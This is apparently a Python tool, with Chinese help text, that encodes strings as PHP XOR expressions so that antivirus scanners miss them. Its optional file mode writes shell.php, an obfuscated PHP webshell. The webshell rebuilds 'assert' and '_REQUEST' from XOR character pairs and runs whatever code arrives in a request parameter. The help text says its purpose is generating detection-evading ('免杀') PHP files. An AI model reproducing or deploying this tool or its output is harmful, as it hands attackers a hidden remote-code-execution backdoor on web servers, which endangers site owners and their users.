# coding:utf-8
import argparse


def chrXORCreat(ch=''):
    return f(bin(ord(ch))[2:], 0, "", "")


def f(ch, index, chr1, chr2):
    if len(ch) <= index:
        if 33 <= int(chr2, 2) and 33 <= int(chr1, 2):
            return chr(int(chr1, 2)), chr(int(chr2, 2))
        else:
            return ""
    else:
        if ch[index] == "1":
            result = f(ch, index + 1, chr1 + "0", chr2 + "1")
            if result == "":
                return f(ch, index + 1, chr1 + "1", chr2 + "0")
            else:
                return result
        else:
            result = f(ch, index + 1, chr1 + "1", chr2 + "1")
            if result == "":
                return f(ch, index + 1, chr1 + "0", chr2 + "0")
            else:
                return result


def getXORStr(st="", cs="."):
    result = ""
    for index in range(len(st)):
        if index + 1 == len(st):
            cs = ""
        ite1, ite2 = chrXORCreat(st[index])
        result += f"('{ite1}' ^ '{ite2}'){cs}"
    return result


parser = argparse.ArgumentParser(description='输入字符获取PHP异或运算的两个可行字符.')
parser.add_argument('-s', '--str', type=str, help='输入字符', required=False)
parser.add_argument('-c', '--constr', type=str, help='默认为PHP字符的连接符“.”', required=False)
parser.add_argument('-f', '--file', type=str, default='n', help='是否生成php免杀文件y/n', required=False)
args = parser.parse_args()

if args.str:
    s = args.str
    if args.constr:
        constr = args.constr
    else:
        constr = "."
    print(getXORStr(s, "."))


if args.file:
    if args.file in ['y', 'Y']:
        with open("shell.php", 'w') as file:
            par1 = getXORStr("assert", ".")
            par2 = getXORStr("_REQUEST", ".")
            file.write(f"""<?php 
$_={par1};
$__={par2};
$___=$$__; 
$_($___[_]);""")
